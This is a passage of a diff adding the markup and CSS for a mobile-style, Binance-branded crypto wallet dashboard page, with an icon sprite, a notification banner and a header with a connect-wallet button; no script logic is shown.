@@ -1,0 +1,2641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
+<title>Binance Web3 Wallet Dashboard</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://s3.tradingview.com/tv.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/davidshimjs-qrcodejs@0.0.2/qrcode.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+:root {
+  --bg: #0B0E11;
+  --card: #1E2329;
+  --surface: #14151A;
+  --elevated: #181A20;
+  --muted: #848E9C;
+  --accent: #F0B90B;
+  --accent-hover: #F8D12F;
+  --accent-weak: rgba(240,185,11,0.12);
+  --glass: rgba(30,35,41,0.72);
+  --text: #EAECEF;
+  --text-secondary: #B7BDC6;
+  --danger: #F6465D;
+  --danger-bg: rgba(246,70,93,0.12);
+  --success: #0ECB81;
+  --success-bg: rgba(14,203,129,0.12);
+  --info: #2EBD85;
+  --border: #2B3139;
+  --border-light: #474D57;
+  --radius-sm: 6px;
+  --radius-md: 8px;
+  --radius-lg: 12px;
+  --radius-xl: 16px;
+  --shadow-sm: 0 1px 2px rgba(0,0,0,0.24);
+  --shadow-md: 0 4px 12px rgba(0,0,0,0.36);
+  --shadow-lg: 0 8px 24px rgba(0,0,0,0.48);
+  font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+}
+
+* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+html, body {
+  height: 100%;
+  background-color: var(--bg);
+  color: var(--text);
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+}
+
+.app-container {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  max-width: 600px;
+  margin: 0 auto;
+  background-color: var(--bg);
+  box-shadow: var(--shadow-lg);
+  position: relative;
+}
+
+.page-content {
+  flex: 1;
+  overflow-y: auto;
+  overflow-x: hidden;
+  padding-bottom: calc(70px + env(safe-area-inset-bottom));
+  scrollbar-width: none;
+  -ms-overflow-style: none;
+}
+.page-content::-webkit-scrollbar { display: none; }
+
+.page {
+  width: 100%;
+  min-height: 100%;
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
+  display: none;
+  animation: fadeIn 0.22s ease-out;
+}
+.page:not(.hidden) { display: block; }
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Binance Fintech UI Components */
+.btn-primary {
+  background: linear-gradient(180deg, var(--accent-hover), var(--accent));
+  color: #181A20;
+  font-weight: 700;
+  border-radius: var(--radius-md);
+  padding: 12px 16px;
+  transition: all 0.18s ease;
+  box-shadow: 0 4px 12px rgba(240,185,11,0.25), inset 0 1px 0 rgba(255,255,255,0.25);
+  border: none;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 14px;
+  letter-spacing: 0.2px;
+}
+.btn-primary:active { transform: translateY(1px); box-shadow: 0 2px 6px rgba(240,185,11,0.2); }
+
+.btn-secondary {
+  background: var(--card);
+  color: var(--text);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  padding: 12px 16px;
+  transition: all 0.18s ease;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 14px;
+  font-weight: 600;
+}
+.btn-secondary:hover { background: var(--elevated); border-color: var(--border-light); }
+.btn-secondary:active { transform: translateY(1px); }
+
+.btn-danger {
+  background: var(--danger-bg);
+  color: var(--danger);
+  border: 1px solid rgba(246,70,93,0.3);
+  border-radius: var(--radius-md);
+  padding: 12px 16px;
+  font-weight: 700;
+  transition: all 0.18s ease;
+  cursor: pointer;
+}
+.btn-danger:hover { background: rgba(246,70,93,0.2); }
+
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 16px;
+  transition: border-color 0.2s ease;
+}
+.card-hover:hover { border-color: var(--border-light); }
+
+.glass-header {
+  background: var(--glass);
+  backdrop-filter: blur(20px) saturate(1.4);
+  -webkit-backdrop-filter: blur(20px) saturate(1.4);
+  border-bottom: 1px solid var(--border);
+}
+
+.footer-nav {
+  background: var(--glass);
+  backdrop-filter: blur(20px) saturate(1.4);
+  -webkit-backdrop-filter: blur(20px) saturate(1.4);
+  border-top: 1px solid var(--border);
+  box-shadow: 0 -4px 20px rgba(0,0,0,0.4);
+  z-index: 50;
+  padding-bottom: env(safe-area-inset-bottom);
+}
+.nav-item {
+  color: var(--muted);
+  transition: color 0.2s ease;
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 3px;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 0.3px;
+  padding: 6px 0;
+  border: none;
+  background: none;
+  cursor: pointer;
+  width: 25%;
+}
+.nav-item svg { transition: transform 0.2s ease, color 0.2s ease; }
+.nav-item.active { color: var(--accent); }
+.nav-item.active svg { transform: translateY(-1px); filter: drop-shadow(0 2px 4px rgba(240,185,11,0.3)); }
+.nav-item::after {
+  content: '';
+  position: absolute;
+  bottom: 2px;
+  width: 20px;
+  height: 3px;
+  border-radius: 2px;
+  background: var(--accent);
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+.nav-item.active::after { opacity: 1; }
+
+.modal-backdrop {
+  background: rgba(0,0,0,0.72);
+  backdrop-filter: blur(4px);
+  z-index: 100;
+}
+.modal-content {
+  background: var(--surface);
+  border-radius: var(--radius-xl);
+  border: 1px solid var(--border);
+  box-shadow: var(--shadow-lg);
+}
+
+/* Daily Banner */
+#dailyNotificationBanner {
+  background: linear-gradient(90deg, #F0B90B, #F8D12F);
+  color: #181A20;
+  box-shadow: 0 4px 12px rgba(240,185,11,0.3);
+  z-index: 90;
+  border-bottom: 1px solid rgba(0,0,0,0.08);
+}
+
+/* Form Elements */
+input, select {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  color: var(--text);
+  border-radius: var(--radius-md);
+  padding: 12px 14px;
+  font-size: 14px;
+  outline: none;
+  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+  width: 100%;
+}
+input:focus, select:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 3px var(--accent-weak);
+}
+input::placeholder { color: var(--muted); }
+
+/* Switch */
+.switch { position: relative; display: inline-block; width: 48px; height: 26px; }
+.switch input { opacity: 0; width: 0; height: 0; }
+.slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: var(--border);
+  border-radius: 26px;
+  transition: 0.3s;
+}
+.slider::before {
+  position: absolute;
+  content: "";
+  height: 20px;
+  width: 20px;
+  left: 3px;
+  bottom: 3px;
+  background: white;
+  border-radius: 50%;
+  transition: 0.3s;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+}
+.switch input:checked + .slider { background: var(--accent); }
+.switch input:checked + .slider::before { transform: translateX(22px); }
+
+/* Animations */
+@keyframes pulse-glow {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(240,185,11,0.25); }
+  50% { box-shadow: 0 0 0 8px rgba(240,185,11,0); }
+}
+.pulse-glow { animation: pulse-glow 2s infinite; }
+
+@keyframes shimmer {
+  0% { background-position: -1000px 0; }
+  100% { background-position: 1000px 0; }
+}
+.skeleton {
+  background: linear-gradient(90deg, var(--card) 25%, var(--elevated) 50%, var(--card) 75%);
+  background-size: 1000px 100%;
+  animation: shimmer 2s infinite linear;
+  border-radius: var(--radius-sm);
+}
+
+/* Utility */
+.text-success { color: var(--success); }
+.text-danger { color: var(--danger); }
+.text-accent { color: var(--accent); }
+.text-muted { color: var(--muted); }
+.bg-success-soft { background: var(--success-bg); }
+.bg-danger-soft { background: var(--danger-bg); }
+.bg-accent-soft { background: var(--accent-weak); }
+
+/* Scrollbar for desktop */
+@media (min-width: 640px) {
+  .page-content::-webkit-scrollbar { width: 6px; display: block; }
+  .page-content::-webkit-scrollbar-track { background: transparent; }
+  .page-content::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+}
+
+/* Ticker tape */
+.ticker-wrap {
+  width: 100%;
+  overflow: hidden;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 8px 0;
+  white-space: nowrap;
+}
+.ticker {
+  display: inline-block;
+  animation: ticker 40s linear infinite;
+}
+@keyframes ticker {
+  0% { transform: translateX(0); }
+  100% { transform: translateX(-50%); }
+}
+.ticker-item {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 0 16px;
+  font-size: 12px;
+  font-weight: 600;
+}
+
+/* A-Z List */
+.az-jumpbar {
+  display: flex;
+  gap: 2px;
+  overflow-x: auto;
+  padding: 4px 0;
+  scrollbar-width: none;
+}
+.az-jumpbar::-webkit-scrollbar { display: none; }
+.az-jumpbar button {
+  min-width: 28px;
+  height: 28px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+  background: var(--card);
+  color: var(--muted);
+  font-size: 11px;
+  font-weight: 700;
+  cursor: pointer;
+  flex-shrink: 0;
+  transition: all 0.15s ease;
+}
+.az-jumpbar button:hover, .az-jumpbar button.active {
+  background: var(--accent);
+  color: #181A20;
+  border-color: var(--accent);
+}
+
+.coin-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 14px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  margin-bottom: 8px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+.coin-row:hover { background: var(--elevated); border-color: var(--border-light); transform: translateY(-1px); }
+.coin-row:active { transform: translateY(0); }
+
+/* News Card */
+.news-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 14px;
+  margin-bottom: 10px;
+  transition: border-color 0.2s ease;
+}
+.news-card:hover { border-color: var(--border-light); }
+.news-card img {
+  width: 100%;
+  height: 140px;
+  object-fit: cover;
+  border-radius: var(--radius-md);
+  margin-bottom: 10px;
+  background: var(--surface);
+}
+
+/* Badge */
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 3px 8px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.3px;
+}
+.badge-success { background: var(--success-bg); color: var(--success); }
+.badge-danger { background: var(--danger-bg); color: var(--danger); }
+.badge-accent { background: var(--accent-weak); color: var(--accent); }
+
+/* Network Card */
+.network-card {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  cursor: pointer;
+  transition: all 0.18s ease;
+}
+.network-card:hover { border-color: var(--accent); background: var(--elevated); }
+.network-card.selected { border-color: var(--accent); background: var(--accent-weak); }
+
+/* Loading spinner */
+.spinner {
+  width: 24px;
+  height: 24px;
+  border: 2.5px solid var(--border);
+  border-top-color: var(--accent);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Chart container */
+.tv-container {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+}
+
+/* Section title */
+.section-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+/* Activity item */
+.activity-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 0;
+  border-bottom: 1px solid var(--border);
+}
+.activity-item:last-child { border-bottom: none; }
+
+/* Toast */
+.toast {
+  position: fixed;
+  top: 16px;
+  left: 50%;
+  transform: translateX(-50%) translateY(-120%);
+  background: var(--card);
+  border: 1px solid var(--border);
+  color: var(--text);
+  padding: 12px 20px;
+  border-radius: var(--radius-xl);
+  box-shadow: var(--shadow-lg);
+  z-index: 200;
+  transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-weight: 600;
+  font-size: 14px;
+  max-width: 90%;
+}
+.toast.show { transform: translateX(-50%) translateY(0); }
+.toast-success { border-color: var(--success); color: var(--success); background: var(--success-bg); }
+.toast-danger { border-color: var(--danger); color: var(--danger); background: var(--danger-bg); }
+.toast-accent { border-color: var(--accent); color: #181A20; background: var(--accent); }
+</style>
+</head>
+<body>
+
+<!-- SVG Sprite Library -->
+<svg width="0" height="0" style="position:absolute;visibility:hidden;">
+  <defs>
+    <symbol id="icon-home" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9.5l9-7 9 7v9a2 2 0 01-2 2h-4a2 2 0 01-2-2v-4H9v4a2 2 0 01-2 2H3a2 2 0 01-2-2v-9z"/><path d="M9 22V12h6v10"/></symbol>
+    <symbol id="icon-market" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 20V10M12 20V4M6 20v-6"/><path d="M3 20h18"/></symbol>
+    <symbol id="icon-trade" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 7l4-4 4 4M8 17l4 4 4-4"/><path d="M12 3v18"/></symbol>
+    <symbol id="icon-account" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></symbol>
+    <symbol id="icon-search" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></symbol>
+    <symbol id="icon-bell" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></symbol>
+    <symbol id="icon-chat" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></symbol>
+    <symbol id="icon-deposit" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 15V3m0 0l-4 4m4-4l4 4"/><path d="M2 17l.621 2.485A2 2 0 004.561 21h14.878a2 2 0 001.94-1.515L22 17"/></symbol>
+    <symbol id="icon-withdraw" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M2 17l.621 2.485A2 2 0 004.561 21h14.878a2 2 0 001.94-1.515L22 17"/></symbol>
+    <symbol id="icon-copy" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></symbol>
+    <symbol id="icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></symbol>
+    <symbol id="icon-close" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></symbol>
+    <symbol id="icon-arrow-right" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/></symbol>
+    <symbol id="icon-arrow-left" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></symbol>
+    <symbol id="icon-qr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></symbol>
+    <symbol id="icon-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></symbol>
+    <symbol id="icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></symbol>
+    <symbol id="icon-fire" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-1.5-3.5-1.5-5.5a8 8 0 0116 0c0 2-.5 3.5-1.5 5.5-.5 1-1 1.62-1 3a2.5 2.5 0 002.5 2.5 5.5 5.5 0 01-5.5 5.5h-9A5.5 5.5 0 018.5 14.5z"/></symbol>
+    <symbol id="icon-globe" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></symbol>
+    <symbol id="icon-news" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 22h16a2 2 0 002-2V4a2 2 0 00-2-2H8a2 2 0 00-2 2v16a2 2 0 01-4 0v-9a2 2 0 012-2h2"/><path d="M14 10h4"/><path d="M14 14h4"/><path d="M10 10h.01"/><path d="M10 14h.01"/></symbol>
+    <symbol id="icon-wallet" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 12V8H6a2 2 0 00-2 2v8a2 2 0 002 2h14v-4"/><path d="M17 12h.01"/><path d="M2 8h16"/></symbol>
+    <symbol id="icon-send" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></symbol>
+    <symbol id="icon-receive" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M2 17l.621 2.485A2 2 0 004.561 21h14.878a2 2 0 001.94-1.515L22 17"/></symbol>
+    <symbol id="icon-chevron-down" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></symbol>
+    <symbol id="icon-max" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/></symbol>
+    <symbol id="icon-bnb" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F0B90B"/><path d="M16 4l4.2 4.2-1.7 1.7L16 7.3l-2.5 2.6-1.7-1.7L16 4zM9.5 10.5l1.7 1.7L9.5 13.9l-1.7-1.7 1.7-1.7zm13 0l1.7 1.7-1.7 1.7-1.7-1.7 1.7-1.7zM16 11.3l2.5 2.6-1.7 1.7L16 14.6l-2.5 2.6-1.7-1.7 2.5-2.6zm-5.5 5.5l1.7 1.7-1.7 1.7-1.7-1.7 1.7-1.7zm11 0l1.7 1.7-1.7 1.7-1.7-1.7 1.7-1.7zM16 18.7l2.5 2.6-1.7 1.7L16 22l-2.5 2.6-1.7-1.7 2.5-2.6zm-5.5 5.5l1.7 1.7L16 28l4.2-4.2-1.7-1.7L16 24.7l-2.5 2.6-1.7-1.7z" fill="#181A20"/></symbol>
+    <symbol id="icon-btc" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F7931A"/><path d="M22.8 14.3c.3-2-1.2-3-3.3-3.8l.7-2.8-1.7-.4-.7 2.7c-.5-.1-.9-.2-1.4-.3l.7-2.8-1.7-.4-.7 2.8c-.4-.1-.8-.2-1.2-.3l-2.4-.6-.5 1.8s1.3.3 1.3.3c.7.2.9.6.8 1l-.8 3.3c.1 0 .2 0 .3.1l-.3-.1-1.2 4.7c-.1.3-.4.7-.9.6 0 0-1.3-.3-1.3-.3l-.9 2 2.2.6c.4.1.8.2 1.2.3l-.7 2.9 1.7.4.7-2.8c.5.1.9.2 1.4.3l-.7 2.8 1.7.4.7-2.9c3.1.6 5.4-.1 6.4-2.4.8-1.8 0-2.8-1.3-3.5 1-.2 1.7-.8 1.9-2zm-3.3 4.3c-.5 2.1-4.2 1-5.4.7l1-4c1.2.3 4.9.9 4.4 3.3zm.5-4.4c-.5 1.9-3.4.9-4.4.7l.9-3.8c1 .2 4.1.7 3.5 3.1z" fill="#fff"/></symbol>
+    <symbol id="icon-eth" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#627EEA"/><path d="M16.3 4v8.7l7.3 3.3-7.3-12zM8.7 16l7.3-3.3V4L8.7 16z" fill="#fff" opacity=".6"/><path d="M16.3 18.3v7.4l7.4-10.2-7.4 2.8z" fill="#fff"/><path d="M16.3 25.7v-7.4L8.7 15.5l7.6 10.2z" fill="#fff" opacity=".6"/><path d="M16.3 16.7l7.3-3.3-7.3-2.6v5.9z" fill="#fff" opacity=".2"/><path d="M8.7 13.4l7.3 3.3v-5.9l-7.3 2.6z" fill="#fff" opacity=".6"/></symbol>
+    <symbol id="icon-usdt" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#26A17B"/><path d="M16.5 4v2.6c3.6.2 6.3 1 6.3 1.9 0 .9-2.7 1.7-6.3 1.9v3.4c.3 0 .6.1.9.1 3.3.2 5.7.9 5.7 1.7s-2.4 1.5-5.7 1.7c-.3 0-.6.1-.9.1v4.2h-1v-4.2c-.3 0-.6-.1-.9-.1-3.3-.2-5.7-.9-5.7-1.7s2.4-1.5 5.7-1.7c.3 0 .6-.1.9-.1V10.4c-3.6-.2-6.3-1-6.3-1.9 0-.9 2.7-1.7 6.3-1.9V4h1zm0 3.7c3.1.2 5.2.8 5.2 1.3 0 .6-2.1 1.1-5.2 1.3V7.7zm-1 0v2.6c-3.1-.2-5.2-.8-5.2-1.3 0-.6 2.1-1.1 5.2-1.3zm1 5.8c3.1.2 5.2.8 5.2 1.3 0 .6-2.1 1.1-5.2 1.3v-2.6zm-1 2.6c-3.1-.2-5.2-.8-5.2-1.3 0-.6 2.1-1.1 5.2-1.3v2.6z" fill="#fff"/></symbol>
+    <symbol id="icon-chart" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 20V10"/><path d="M12 20V4"/><path d="M6 20v-6"/></symbol>
+    <symbol id="icon-candle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 7V3m0 18v-4"/><path d="M16 7V3m0 18v-4"/><rect x="6" y="7" width="4" height="10" rx="1"/><rect x="14" y="7" width="4" height="10" rx="1"/></symbol>
+    <symbol id="icon-star" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></symbol>
+    <symbol id="icon-more" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></symbol>
+    <symbol id="icon-filter" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></symbol>
+    <symbol id="icon-sort" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5h4"/><path d="M11 9h7"/><path d="M11 13h10"/><path d="M3 17l3 3 3-3"/><path d="M6 18V4"/></symbol>
+    <symbol id="icon-refresh" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></symbol>
+    <symbol id="icon-external" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></symbol>
+    <symbol id="icon-info" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></symbol>
+    <symbol id="icon-alert-triangle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></symbol>
+    <symbol id="icon-hash" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></symbol>
+  </defs>
+</svg>
+
+<!-- Toast Container -->
+<div id="toastContainer" class="toast"></div>
+
+<div class="app-container">
+
+  <!-- DAILY POP-UP NOTIFICATION BANNER -->
+  <div id="dailyNotificationBanner" class="hidden fixed top-0 w-full max-w-[600px] mx-auto p-3 text-sm flex items-center justify-between">
+    <p id="dailyNotificationMessage" class="truncate font-bold text-sm"></p>
+    <button onclick="hideDailyNotification()" class="p-1.5 rounded-full hover:bg-black/10 transition-colors">
+      <svg class="w-4 h-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+    </button>
+  </div>
+
+  <!-- GLOBAL HEADER -->
+  <header id="header" class="sticky top-0 z-20 flex items-center justify-between px-4 py-3 glass-header">
+    <div class="flex items-center gap-3">
+      <div class="w-9 h-9 rounded-lg bg-accent flex items-center justify-center shadow-md">
+        <svg class="w-5 h-5 text-[#181A20]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" fill="currentColor"><path d="M16 4l4.2 4.2-1.7 1.7L16 7.3l-2.5 2.6-1.7-1.7L16 4zM9.5 10.5l1.7 1.7L9.5 13.9l-1.7-1.7 1.7-1.7zm13 0l1.7 1.7-1.7 1.7-1.7-1.7 1.7-1.7zM16 11.3l2.5 2.6-1.7 1.7L16 14.6l-2.5 2.6-1.7-1.7 2.5-2.6zm-5.5 5.5l1.7 1.7-1.7 1.7-1.7-1.7 1.7-1.7zm11 0l1.7 1.7-1.7 1.7-1.7-1.7 1.7-1.7zM16 18.7l2.5 2.6-1.7 1.7L16 22l-2.5 2.6-1.7-1.7 2.5-2.6zm-5.5 5.5l1.7 1.7L16 28l4.2-4.2-1.7-1.7L16 24.7l-2.5 2.6-1.7-1.7z"/></svg>
+      </div>
+      <div>
+        <h1 id="pageTitle" class="text-lg font-bold text-text tracking-tight">Home</h1>
+      </div>
+    </div>
+    <div class="flex items-center gap-1">
+      <button onclick="showPage('notification')" class="p-2.5 rounded-xl hover:bg-white/5 transition-colors relative">
+        <svg class="w-5 h-5 text-muted"><use href="#icon-bell"/></svg>
+        <span id="notifBadge" class="absolute top-1.5 right-1.5 w-2 h-2 bg-danger rounded-full hidden"></span>
+      </button>
+      <button onclick="showPage('search')" class="p-2.5 rounded-xl hover:bg-white/5 transition-colors">
+        <svg class="w-5 h-5 text-muted"><use href="#icon-search"/></svg>
+      </button>
+      <button onclick="showPage('chat')" class="p-2.5 rounded-xl hover:bg-white/5 transition-colors">
+        <svg class="w-5 h-5 text-muted"><use href="#icon-chat"/></svg>
+      </button>
+      <button id="connectWalletBtn" onclick="toggleWalletConnection()" class="ml-1 text-xs px-3 py-1.5 rounded-lg font-bold transition-all duration-300 border border-transparent"></button>
+    </div>
+  </header>
+
+  <!-- PAGE CONTENT CONTAINER -->
